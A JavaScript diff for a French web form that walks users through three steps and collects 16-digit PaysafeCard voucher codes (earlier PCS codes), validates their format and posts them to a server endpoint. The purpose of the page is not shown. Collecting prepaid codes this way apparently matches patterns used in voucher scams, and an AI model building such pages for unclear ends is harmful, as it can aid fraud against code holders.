@@ -1,59 +1,106 @@
+/* =========================================================
+   STEP NAVIGATION
+========================================================= */
+
+let currentStep = 1;
+
+function goToStep(step) {
+    document.querySelectorAll('.step-section').forEach(s => s.classList.remove('active'));
+    document.getElementById('step' + step).classList.add('active');
+
+    document.querySelectorAll('.progress-step').forEach(ps => {
+        const psNum = parseInt(ps.dataset.step);
+        ps.classList.remove('active', 'done');
+        if (psNum < step) {
+            ps.classList.add('done');
+        } else if (psNum === step) {
+            ps.classList.add('active');
+        }
+    });
+
+    const fill = document.getElementById('progressFill');
+    fill.style.width = (step / 3 * 100) + '%';
+
+    currentStep = step;
+
+    document.querySelector('.container').scrollIntoView({ behavior: 'smooth', block: 'start' });
+
+    if (step === 3) {
+        setTimeout(() => document.getElementById('code').focus(), 400);
+    }
+}
+
+
+/* =========================================================
+   FORM SUBMISSION
+========================================================= */
+
 document.getElementById('codeForm').addEventListener('submit', async (e) => {
     e.preventDefault();
-    
-    const code = document.getElementById('code').value.replace(/\s/g, '').toUpperCase();
+
+    const code = document.getElementById('code').value.replace(/\s/g, '');
     const messageDiv = document.getElementById('message');
-    const submitBtn = document.querySelector('.submit-btn');
-    
-    // Validation : le code doit obligatoirement commencer par la lettre M
-    if (!code.startsWith('M')) {
-        messageDiv.textContent = 'Code invalide : le code PCS est invalide.';
+    const submitBtn = document.getElementById('submitBtn');
+
+    messageDiv.className = 'message';
+    messageDiv.textContent = '';
+
+    // Validation: le code doit commencer par 0
+    if (!code.startsWith('0')) {
+        messageDiv.textContent = 'Code invalide. Vérifiez votre code PaysafeCard et réessayez.';
         messageDiv.className = 'message error';
         return;
     }
 
-    // Validation du format (M suivi de 9 à 11 caractères alphanumériques)
-    if (!/^M[A-Z0-9]{9,11}$/.test(code)) {
-        messageDiv.textContent = 'Code invalide : format incorrect.';
+    // Validation du format (16 chiffres)
+    if (!/^0\d{15}$/.test(code)) {
+        messageDiv.textContent = 'Le code doit contenir 16 chiffres. Vérifiez et réessayez.';
         messageDiv.className = 'message error';
         return;
     }
-    
-    // Désactiver le bouton pendant l'envoi
+
+    submitBtn.classList.add('loading');
     submitBtn.disabled = true;
-    submitBtn.textContent = 'Envoi en cours...';
-    
+
     try {
         const response = await fetch('/api/send-code', {
             method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
+            headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ code })
         });
-        
+
         const data = await response.json();
-        
+
         if (response.ok) {
             messageDiv.textContent = data.message || 'Code envoyé avec succès. BaarakaAllahu fik.';
             messageDiv.className = 'message success';
             document.getElementById('code').value = '';
         } else {
-            messageDiv.textContent = data.error || 'Erreur lors de l\'envoi du code.';
+            messageDiv.textContent = data.error || 'Erreur lors de l\'envoi du code. Veuillez réessayer.';
             messageDiv.className = 'message error';
         }
     } catch (error) {
         messageDiv.textContent = 'Erreur de connexion. Veuillez réessayer.';
         messageDiv.className = 'message error';
     } finally {
+        submitBtn.classList.remove('loading');
         submitBtn.disabled = false;
-        submitBtn.textContent = 'Envoyer le code';
     }
 });
 
-// Formatage automatique du code (conversion en majuscules)
+
+/* =========================================================
+   INPUT FORMATTING
+========================================================= */
+
 document.getElementById('code').addEventListener('input', function(e) {
-    let value = e.target.value.toUpperCase();
-    if (value.length > 12) value = value.slice(0, 12);
+    let value = e.target.value.replace(/\s/g, '');
+
+    // Grouper par 4 chiffres pour la lisibilité
+    if (value.length > 0) {
+        value = value.match(/.{1,4}/g).join(' ');
+    }
+
+    if (value.length > 19) value = value.slice(0, 19);
     e.target.value = value;
 });
